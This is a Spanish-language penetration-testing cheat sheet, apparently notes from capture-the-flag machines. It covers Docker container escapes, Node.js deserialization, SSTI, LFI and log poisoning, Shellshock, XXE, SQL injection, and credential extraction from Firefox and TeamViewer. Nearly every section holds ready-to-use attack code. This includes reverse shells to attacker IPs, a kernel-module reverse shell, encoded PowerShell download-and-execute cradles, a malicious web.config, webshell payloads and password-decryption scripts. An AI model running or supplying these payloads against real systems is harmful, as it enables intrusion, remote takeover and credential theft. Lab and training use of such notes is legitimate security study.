- Estando como root en el contenedor creado, si quero instalar algo, primero hago: `apt-get update`. Después ya puedo instalar el paquete que quiero.
- Si quiero instalar una verión concreta de base de datos y además quiero que me monte una carpeta mia, por ejemplo si me descargado una base de datos y quiero desplegarla en un contenedor. En este ejemplo le estoy diciendo que monte el contenido que tengo dentro de la carpeta `/tmp/test/`, dentro del contenedor en la carpeta `/var/lib/mysql`:
```bash
sudo docker run --name mariadb -v /tmp/test:/var/lib/mysql -d mariadb:10.3.31
 ```
 #### Docker Breakout
 ##### Abusing DAC_READ_SEARCH capability
- En hacktricks https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation podemos encontrar formas para enumerar el contenedor e intentar escapar de el o escalar privilegios.
- Herramienta para buscar vías para escapar del contenedor: https://github.com/cdk-team/CDK
```bash
cdk_linux_amd64 # Descargar
./cdk help # Ayuda
./cdk evaluate # Escanear las opciones para escapar del contenedor

./cdk run cap-dac-read-search /root/root.txt # En este ejemplo hay una capabilities que me permite leer archivos de la máquina principal
```
##### Sockets Files, escalada de privilegios en docker
- Si estoy como root en un contenedor puedo intentar crear otro contenedor en el que se monte la raíz de la máquina principal:
```bash
# Fuente: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-sockets
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json # Listar imágenes existentes
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"sandbox:latest","HostConfig":{"Binds": ["/:/mounted"]},"Cmd":["/bin/sh", "-c", "chmod u+s /mounted/bin/bash"],"Tty": true}' http://localhost/containers/create # Crea una montura en la que se monta la raíz de la máquina principal y se le asigna el permiso SUID a la /bin/bash
# {"Id":"7258518b743a638296efc6416e2bcbeb92765f7d2a11d971fa35ae9bed0e9571","Warnings":[]} # Me devuelve este output
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/7258/start # Arranca el contenedor creado anteriormente y ejecuta el comando que quiero

# Ahora la /bin/bash de la máquina principal tendría que tener el permiso SUID. Si es así, con poner bash -p ta tendría que ser root
```
##### Abusing SYS_MODULE capability
- Puedo intentar explotar esta capability si me la encuentro en un contenedor, para conseguir una reverse shell en la máquina princpal:
```bash
# Fuente: https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
capsh --print # Para ver las capability del contenedor
cap_sys_module # Esta es la busco
```
- Crear este archivo en el contenedor: reverse-shell.c
```bash
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.1/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
##### Docker 18.06.0-ce
```bash
docker --version # Ver la versión que se esta usando
Fuente: https://github.com/Frichetten/CVE-2019-5736-PoC
var payload = "#!/bin/bash \n chmod u+s /bin/bash" # Me descargo el script y modifico esta linea, payload = "#!/bin/bash \n" + shellCmd
go build main.go # Lo compilo
# Ahora tengo que tener dos consolas abiertas, una en la máquina principal y otra en el contenedor
./main # Primero ejecuto el exploit en el contenedor, y mientras se ejecuta desde la consola de la máquina principal ejecuto el comando siguiente
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh # Segundo, desde la máquina principal ejecuto este comando 
```
- Crear este archivo en el contenedor: Makefile
```bash
obj-m +=reverse-shell.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
```bash
make # Ahora hacer un make y ponerme en escucha para conseguir la shell
insmod reverse-shell.ko # Con el make anterior se nos creará un archivo reverse-shell.ko que tenemos que ejecutar con este comando
```
##### Usuario incluido en el grupo Docker
- Si un usuario está incluido en el grupo docker puede crear contenedores y gracias a estar incluido en este grupo se puede intentar conseguir una shell como root:
```bash
Fuente: https://gtfobins.github.io/gtfobins/docker/#shell
docker images # Ver las imágenes disponibles
docker run -v /:/mnt --rm -it ubuntu bash # Crea una montura de todos los archivos de la máquina principal en la carpeta /mnt del nuevo contenedor
chmod u+s /mnt/bin/bash # Ahora desde el contenedor podemos por ejemplo, modificar los permisos de la /bin/bash de la máquina principal

> O esto:
Fuente: https://gtfobins.github.io/gtfobins/docker/
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
### Node js JWT
#### Rutas útiles:
```bash
/opt/blog/server.js
/var/www/html/server.js
```
#### Node js deserialización
```bash
Fuente: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

npm # Instalar si quiero hacer pruebas en local
sudo npm install node-serialize # Instalar si quiero hacer pruebas en local

> Ejemplo de deserialización en local. Creo un archivo example.js le doy permiso de ejecución y al ejecutarlo tendría que ver ejecutado un ls de la raíz de mi equipo:

node example.js

var serialize = require('node-serialize');
var payload = {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(payload);

> Probar RCE en Node.js:

# 1º URL encodeo con BurpSuite el siguiente comando:
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 1 10.10.14.13', function(error, stdout, stderr) { console.log(stdout) }); }()"}

# 2º Me pongo en escucha con tcpdump de trazas icmp e incluyo el comando encodeado en el campo cookie de la web y trendría que recibir el ping.

> Reverse shell:

# 1º Genero un código en base64 del siguiente comando:

echo "bash -i >& /dev/tcp/10.10.14.13/443 0>&1" | base64 -w 0

# 2º Incorporo el código en base64 en el comando que antes he utilizado y en el mismo comando lo desencipto y lo pipeo con bash para que lo interprete:

{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMQo=|base64 -d|bash', function(error, stdout, stderr) { console.log(stdout) }); }()"}

# 3º Me pongo en escucha para recibir la reverse shell, URL encodeo con BurpSuite el comando anterior e incluyo el comando encodeado en el campo cookie de la web, recargo y trendría que recibir la reverse shell.
```
#### Ejemplo máquina: Secret
- Crear un nuevo usuario:
```bash
curl -s -X POST "http://10.10.11.120:3000/api/user/register" -H "Content-Type: application/json" -d '{"name": "Tom","email": "tom@tom.com","password": "Tom123$!"}'; echo
```
- Obtener mi jwt:
```bash
curl -s -X POST "http://10.10.11.120:3000/api/user/login" -H "Content-Type: application/json" -d '{"email": "Tom@Tom.com","password": "Tom123$!"}'; echo
```
- Web para ver y trastear el Json Web Token: `https://jwt.io/`
- Para comprobar que tipo de token tengo:
```bash
curl -s -X GET "http://10.10.11.120:3000/api/priv" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmYyNzkzN2EzOGVkZTA0NWI5YzRkMzAiLCJuYW1lIjoidG9tYXNhIiwiZW1haWwiOiJ0b21hc0B0b21hcy5jb20iLCJpYXQiOjE2NjAwNTg4MjJ9._tvyUAjQFs61PaAg3VZCcRqMRO2euud4Oi6LNdpcTFo" | jq
```
#### Cambiar privKey.key del JWT
- Si el JWT hace una petición para solicitar una privKey.key puedo intentar cargarla de mi lado:
```bash
openssl genrsa -out privKey.key 2048 # Genero una clave privada y me la comparto desde un servidor con python
# Cambio el valor de admin  de 0 a 1, añado la privKey.key en el campo Private Key en jwt.io y modifico la dirección de la privKey.key para que se cargue desde mi servidor
```
### Nodered
- Para enviarnos una reverse shell desde Node red tenemos que crear un diagrama con nuestros datos para realizar la conexión:
```bash
https://github.com/valkyrix/Node-Red-Reverse-Shell/blob/master/node-red-reverse-shell.json # Fuente del codigo

> Código:
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.18","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]

# Ahora busco en el menu de la derecha Import > Clipboard. Despues me pongo en escucha y de doy a "Deploy"
```
### GIT
- Comandos útiles:
```bash
git clone <URL_REPOSITORIO> # Clonar el repositorio
git log # Ver los logs de un proyecto, dentro de la carpeta del proyecto
git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 # Ver los cambios realizados en un commit
git branch -a # Ver las ramas del proyecto que existen
git checkout dev # Cambiar a la rama dev
```
- En este caso revisando el código descargado he encontrado un commit en el que aparecía el SECRET_TOKEN y metiendolo en la web jwt.io me crea un auth-token correcto:
```bash
curl -s -X GET "http://10.10.11.120:3000/api/logs" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmYyOGVmM2EzOGVkZTA0NWI5YzRkM2QiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRvbWFzOEB0b21hcy5jb20iLCJpYXQiOjE2NjAwNjM1MTF9.HvfQwWBiJ0BNDKYtdeCdwtUpkofL3rUkUU291NMd2fo"
```
- Para tramitar data por get, e intentar conseguir una reverse shell:
```bash
curl -s -X GET -G "http://10.10.11.120:3000/api/logs" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmYyOGVmM2EzOGVkZTA0NWI5YzRkM2QiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRvbWFzOEB0b21hcy5jb20iLCJpYXQiOjE2NjAwNjM1MTF9.HvfQwWBiJ0BNDKYtdeCdwtUpkofL3rUkUU291NMd2fo"  --data-urlencode "file=/etc/passwd;bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"
```
### Firefox credentials
#### Firepwd
- Si al acceder a un equipo, encontramos algún archivo que pueda estar relacionado con Firefox, podemos revisar el directorio `C:\Users\<NOMBREUSUARIO>\AppData\Roaming\Mozilla\` y sus capetas interiores para ver si encontramos archivos como `key4.db` o `logins.json`, si esto suede se sinonimo de que se estan guardando credenciales de la sesión de un usuario.
- Me descargo esos dos archivos e instalo la herramienta firepwd:
```bash
git clone https://github.com/lclevy/firepwd.git
pip3 install -r requirements.txt
```
- Ahora meto los archivos `key4.db` o `logins.json` dentro del directorio firepwd y lanzo la herramienta para obtener las credenciales de sesión del usuario: `python3 firepwd.py`
- Si obtengo las credenciales puedo intentar conectarme a la máquina por ejemplo así:
```bash
impacket-psexec <NOMBREEQUIPO>/<NOMBREUSUARIO>:<PASSWORD>@10.10.10.237 cmd.exe
python psexec.py <NOMBREEQUIPO>/<NOMBREUSUARIO>:<PASSWORD>@10.10.10.237
```
#### Firefox_decrypt
- También puedo usar firefox_decrypt, primero me descargo la herramenta y me descargo de la máquina objetivo al menos los siguientes 4 archivos: `key4.db`, `logins.json`, `cookies.sqlite` y `cert9.db`.
```bash
git clone https://github.com/unode/firefox_decrypt
```
- Para usar la herramienta tengo que indicar la ruta donde he descargado esos archivos:
```bash
python3 firefox_decrypt.py /<RUTA4ARCHIVOS>
```
- Si me pide una password y no la tengo, pulso enter.
### Microsoft iis 7
- Si me permite subir archivos de alguna forma, podría intentar subir un archivo web.config malicioso como un archivo asp. Código de ejemplo: https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/ y código asp: https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html. Creo el archivo `web.config`:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1')")
output = cte.StdOut.Readall()
Response.write(output)
%>
-->
```
- Ahora me descargo el `Invoke-PowerShellTcp.ps1`: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 y lo modifico incorporando al final lo siguiente (en la carpeta script tengo una copia que ya esta modificada, solo tengo que cambiar la ip):
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
```
- Y por último abro un servidor con python para poder usar el `Invoke-PowerShellTcp.ps1` y me pongo en escucha con netcat para recibir la reverse shell.
##### Reverse shell aspx
- Este es un ejemplo de una reverse shell .aspx usada en un Microsoft IIS httpd 7.5 en la máquina Devel:
```bash
https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
```
### XDEBUG
- Si al revisar el archivo de información de php, `info.php` veo que el módulo XDEBUG está activado puedo intentar explotarlo y conseguir una reverse shell.
```bash
# Fuente exploit: https://github.com/D3Ext/XDEBUG-Exploit
python3 xdebug.py -u http://172.20.0.10/info.php -l 172.30.0.9

# Si el exploit funciona correctamente puedo intentar ejecutar comandos en la máquina y conseguir una reverse shell                                                  
bash -i >& /dev/tcp/172.30.0.9/443 0>&1 # Creo un archivo rev.sh con el siguiente contenido, me lo comparto con un servidor con python y me pongo en escucha
system("wget 172.30.0.9/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && bash /tmp/rev.sh"); # Ahora ejecuto el siguiente comando en el exploit y tendría que obtener una shell
```
### Jamovi
- Jamovi es una hoja de cálculo que permite la realización de cálculos estadísticos y utiliza el lenguaje de programación R en su entorno. Podemos intentar ejecutar comandos y obtener una reverse shell:
```bash
# Pulsamos en la R > Rj Editor
system("whoami", inter = TRUE); # Ver el output de los comandos que se ejecutan
system("bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'"); # Nos ponemos en escucha, escribimos esto en el editor y pulsamos Ctrl + Shift + Enter
```
### RocketChat
- Cambiar la contraseña de un usuario desde mondodb con mongosh:
```bash
Fuente: https://docs.rocket.chat/guides/administration/admin-panel/advanced-admin-settings/restoring-an-admin

# Cambia la contraseña de admin a 12345
db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```
- Exploit para conseguir una reverse shell en la versión Rocket.Chat 2.4.14 - CVE-2021-22911:
```bash
Fuente: https://github.com/CsEnox/CVE-2021-22911

# Navegar por Options > Administration > Integrations > New Integration > Incoming WebHook
# Poner todo a True, rellenar el resto e incluir en script:

const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('bash -c "bash - >& /dev/tcp/10.10.14.4/443 0>&1"');

# Después me pongo en escucha y navegamos otra vez hasta Integrations > Incoming WebHook y buscar la url de la Integration que hemos creado
```
### TeamViewer
- TeamViewer es un software para el acceso remoto y permite controlar y ofrecer soporte de forma remota. Si vemos TeamViewer instalado en el equipo quizas podamos escalar privilegios:
```bash
Fuente: https://0xdf.gitlab.io/2020/09/05/htb-remote.html
Módulo Metasploit: /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb

tasklist
TeamViewer_Service.exe

> 1º Buscamos el Path de la instalción del TeamViewer para ver la versión (en este ejemplo Versión 7):

PS > C:\Program Files (x86)\TeamViewer

> 2º Ver el campo SecurityPasswordAES que está dentro de la clave de registro del software:

PS > cd HKLM:SOFTWARE\WOW6432Node\TeamViewer\version7
PS > get-itemproperty -path .
PS > (get-itemproperty -path .).SecurityPasswordAES

[255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91]

> 3º Crear el script para desencriptar la key DecryptPassword.py:
pip3 install pycryptodome # Instalar

#!/usr/bin/python3

from Crypto.Cipher import AES
import Crypto.Cipher.AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
IV = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key,AES.MODE_CBC,IV)

password = aes.decrypt(ciphertext).decode().rstrip("\x00")

print(f"[+] Password: {password}")
```
### ServiceDesk plus
- Para poder ejecutar comandos es necesario estar logueados como el usuario Administrador. Si lo soy, puedo intentar mandarme una reverse shell: 
```bash
# 1º Navego por el panel de Admin > Helpdesk Customizer > Custom Trigger > Add New Action
# 2º Relleno todos los campos obligatorios y en el campo: "Match the below criteria" indico "Sender", "no contains", "ygjkhgkjhg" estoy poniendo una cadena de texto aleatoria
# 3º En el campo "Perform Action" > "Action Type" indico "Execute Script", "Script file to run" indico "cmd /c ping -n 4 10.10.14.13" y pulso en Save
# 4º Me pongo en escucha de trazas icmp y navego por Requests > New incident y completo los campos obligatorios y pulso en Add request
# 5º Ya tendría que estar recibiendo las trazas icmp, en el caso de que sea así, repito el proceso pero compartiendome el script Invoke-PowerShellTcp.ps1 a través de un servidor con python, poniendome en escucha por un puerto y ejecutado el siquiente comando: cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Invoke-PowerShellTcp.ps1') 
```
## Vulnerabilidades Web
### SSTI Server Side Template Injection
- Informacion y comandos: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

- Algunos ejemplos:
```bash
{{7*7}}
{7*7}

> Leer archivos locales
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

> Comprobar RCE
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} {{ config.from_pyfile('/tmp/evilconfig.cfg') }} {{ config['RUNCMD']('id',shell=True) }}

> Reverse shell
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} {{ config.from_pyfile('/tmp/evilconfig.cfg') }} {{ config['RUNCMD']('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.8 443 >/tmp/f',shell=True) }}
```
#### SSTI ASP
- Si estoy en un Microsoft IIS y este contiene algún formulario en el que pueda inyectar contenido y que después me permita ver el output, puedo intentar ejecutar un SSTI:
```bash
Fuente: https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html

<%response.write(7*7)%> # Comprobar si es vulnerable al SSTI
<%response.write CreateObject("WScript.Shell").Exec("cmd /c ping -n 2 10.10.14.9").StdOut.Readall()%> # Comprobar si puedo ejecutar comandos en el sistema con cmd

> Para comprobar si puedo ejecutar comandos en el sistema con powershell tengo que enviar la petición encodeada:
echo "ping -n 8 10.10.14.9" | iconv -t utf-16le | base64 -w 0 # El output de este comando encodeado es el que tengo que añadir a la petición
<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand cABpAG4AZwAgAC0AbgAgADgAIAAxADAALgAxADAALgAxADQALgA5AAoA").StdOut.Readall()%>

> Ahora intento conseguir una reverse shell siguiendo el mismo procedimiento:
echo "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.9/Invoke-PowerShellTcp.ps1\")" | iconv -t utf-16le | base64 -w 0 # El output de este comando encodeado es el que tengo que añadir a la petición
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0 # O esto si el anterior no funciona

# Ahora me comparto el script desde un servidor en python, me pongo en escucha y lanzo el comando encodeado para powershell:
<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADkALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAiACkACgA=").StdOut.Readall()%>
```
#### SSTI Java
- Esta herramienta es un generador específico de payload para SSTI en Java, este es un ejemplo para conseguir una reverse shell:
```bash
Fuente: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java

> Comprobar si es vulnerable:
${7*7}
#{7*7} 
*{7*7} 
@{7*7}
~{{7*7}

> Conseguir la reverse shell:

git clone https://github.com/VikasVarshney/ssti-payload
chmod +x ssti-payload.py

# Creo un archivo llamado shell.sh con el siguiente contenido:


#!/bin/bash

bash -i >& /dev/tcp/10.10.14.13/443 0>&1


python3 ssti-payload.py # Ejecuto la herramienta y genero los payloads de los cuatro siguientes comandos

whoami # Primero para comprobar que puedo explotar el SSTY
wget http://10.10.14.13/shell.sh
chmod +x shell.sh
./shell.sh

# Ahora abro un servidor con python, me pongo en escucha y exploto el SSTI enviando los payload de uno en uno para obtener la reverse shell
```
### LFI y Directory Path Traversal
```bash
> LFI
Fuente: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
Fuente: https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#lfi
Fuente: https://book.hacktricks.xyz/pentesting-web/file-inclusion

> Directory Path Traversal
Fuente: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

> Algunos ejemplos básicos de LFI y Directory Path Traversal:

http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../etc/passwd%00
http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=common
../../../../../../../../../etc/passwd
....//....//....//....//....//....//....//....//....//etc/passwd
..././..././..././..././..././..././..././..././...//etc/passwd
..././..././..././..././..././..././..././..././..././etc/passwd
```
#### fimap
- fimap es una herramienta en python que puede ayudar a encontrar errores de inclusión de archivos locales y remotos:
```bash
Fuente: https://github.com/kurobeats/fimap
Fuente: https://sec-art.net/2021/10/27/fimap-tool-for-exploiting-remote-local-file-inclusion-vulnerability-lfi-attacks/

git clone https://github.com/kurobeats/fimap # El script está en la carpeta src
pip2 install httplib2 # Instalar

python fimap.py -u "http://10.10.10.80/?op=upload"
python fimap.py -H -d 3 -u "http://preprod-marketing.trick.htb/index.php?page=services.html" -w fimap_output.txt # -H es para rastrear todo (web spidering) y -d 3 es para hacerlo con 3 niveles de profundidad
```
#### LFISuite
- LFISuite es una herramienta automática capaz de escanear y explotar las vulnerabilidades de inclusión de archivos locales:
```bash
Fuente: https://github.com/D35m0nd142/LFISuite
git clone https://github.com/D35m0nd142/LFISuite  

python lfisuite.py # Elegir por ejemplo la opción 2 para escanear, responder a las preguntas y poner la url por ejemplo http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=
```
### Log Poisoning LFI a RCE
- Si puedo acceder a los archivos de logs a tráves de un LFI puedo intentar convertir el LFI a RCE a través de un log poisoning (Ejemplo con FreeBSD):
```bash
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log # Ejemplo de logs
# Capturo cualquier página, puede ser una inventada con BurbSuite y lo mando al Repiter

User-Agent: <?php system($_GET[cmd]); ?> # Pulso Send en el Repiter y después modifico el User Agent
view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=whoami # Ahora dejo de capturar la web con BurpSuite y recargo la página de logs añadiendo &cmd=whoami para ver si puedo ejecutar comandos

&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.13 443 >/tmp/f # Ahora me pongo en escucha e intento enviarme una reverse shell
```
##### Log poisoning, ejemplo máquina Bart:
```bash
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey # Esta es la url desde la que puedo ver los logs
http://internal-01.bart.htb/log/log.php?filename=mylog.php&username=harvey # La máquna me permite crear mi propio log y cambiar la extensión a php

http://internal-01.bart.htb/log/mylog.php # Esta es la url de mi log

> Ahora creo un script (exploit.py) para comprobar si es vulnerable. Primero cambio el User Agent, ejecuto el exploit y al revisar mi log tendría que ver la petición realizada con el nombre de usuario:

#!/usr/bin/python3

import requests

url = "http://internal-01.bart.htb/log/log.php?filename=mylog.php&username=harvey"
headers = {'User-Agent': '<?php system("whoami"); ?>'}
r = requests.get(url, headers=headers)

> En este punto modifico el script para conseguir una webshell que me permita ejecutar comandos desde el parámetro cmd:

#!/usr/bin/python3

import requests, os

url = "http://internal-01.bart.htb/log/log.php?filename=tom.php&username=harvey"

headers = {'User-Agent': '<?php system($_GET["cmd"]); ?>'}

r = requests.get(url, headers=headers)

> Ahora para conseguir una reverse shell me descargo y modifico el script Invoke-PowerShellTcp.ps1, me lo comparto a través de un servidor con python y me pongo en escucha:

http://internal-01.bart.htb/log/tom.php?cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Invoke-PowerShellTcp.ps1') # Ejecuto la petición desde el navegador
http://internal-01.bart.htb/log/tom.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Invoke-PowerShellTcp.ps1') # O de esta forma
```
### SFC-File
- Capturar hash net-NTLMv2 (ejemplo en https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/). Primero creo un archivo file.scf con el contenido:
```bash
[Shell]
Command=2
IconFile=\\miip\smbFolder\pentestlab.ico # No es necesario que exista en archivo pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
- Después comparto un recurso de red con impacket-smbserver y subo el archivo file.scf para recibir el hash net-NTLMv2. Después pongo el contenido en un archivo hash y lo intento descifrar con john. Este tipo de hashes no sirven para hacer Pass The Hash.
### Shellshock
- Ataque shellshock, lo que se hace es `cambiar el user agent` para mandarte una reverse shell. Un indicador de que este ataque puede ser válido es ver la carpeta `cgi-bin`:
```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1"
```
### XXE XML external entity injection
- Si me encuentro con un formulario web en el que puedo introducir datos y el output sale reflejado en la web, puedo interceptar la petición con BurpSuite para ver su estructura. Si es `xml`, puede ser vulnerable a `xxe`.
- Para comprobarlo puedo intentar crear una entidad con el `wrapper file` para ver si puedo listar los archivos internos del equipo. Este sería el código para crear la entidad `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` y ahora introduzco &xxe; en alguno de los campos del formulario.
- Este sería un código de ejemplo (BountyHunter):
```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
		</bugreport>
```
- Si quiero ver algún `archivo php` puedo utilizar un wrapper diferente:
```bash
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
```
- En ambos casos es posible que el contenido tenga que ser enviado o sea recibido en `base64` o `url encodeado`, hay que tenerlo encuenta para que la petición se tramite correctamente.
### SQL Injection
- Fuente: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- Fuente: https://book.hacktricks.xyz/pentesting-web/sql-injection
- Para explotar una inyeccion sql, por ejemplo, primero intento buscar el punto en el que se puede producir la inyeccion, probablemente sea necesario url encodearlo y probar quitando y poniendo columnas para ver el punto de inyección, por ejemplo así:
```bash
' ORDER BY 1,2,3,4-- -
' union select 1,2,3,4-- -
```
- Ejemplos de inyecciones sql en una base de datos con 3 columnas, en la que la columna 1 es la inyectable:
```bash
' union select database(),2,3 limit 0,1-- - # Para saber el nombre de la base de datos en uso
' union select schema_name,2,3 from information_schema.schemata limit 0,1-- - # Para saber las bases de datos existentes
' union select table_name,2,3 from information_schema.tables where table_schema="ozdb" limit 0,1-- - # Para enumerar las tablas de una base de datos
' union select column_name,2,3 from information_schema.columns where table_schema="ozdb" and table_name="users_gbw" limit 0,1-- - # Para enumerar las columnas de una tabla
' union select group_concat(username,0x3a,password),2,3 from users_gbw limit 0,1-- - # Para ver el contenido de las columnas de una tabla

# Para mostrar el resultado de la inyección de 1 en 1 usar limit 0,1-- -
```
